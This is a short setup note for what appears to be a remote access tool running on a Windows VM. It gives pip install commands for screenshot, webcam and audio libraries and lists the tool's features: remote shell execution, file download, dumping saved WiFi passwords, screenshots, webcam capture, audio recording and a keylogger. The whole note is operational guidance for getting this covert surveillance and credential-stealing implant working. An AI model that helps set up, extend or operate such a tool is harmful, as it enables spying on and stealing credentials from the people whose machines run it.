# Quick VM Setup Instructions

## Your VM has no Python packages installed. Here are the fixes:

### Option 1: Install Pillow (Recommended - Easy)
```cmd
pip install pillow
```
Then restart the agent and `/cmd screenshot` will work.

### Option 2: Use the built-in fallback
The agent now has a pure stdlib fallback using Windows API.
Just run `/cmd screenshot` - it will automatically use the ctypes method.

### Option 3: Install all dependencies
```cmd
pip install pillow mss opencv-python pyaudio
```

## What Works Now (No Dependencies):
- ✅ Shell commands (`exec whoami`)
- ✅ File operations (`ls`, `download`)
- ✅ WiFi password dump (`creds`)
- ✅ Screenshot (ctypes fallback)

## What Needs Packages:
- ❌ Webcam (`pip install opencv-python`)
- ❌ Audio recording (`pip install pyaudio`)
- ❌ Keylogger (works on Windows, no package needed)
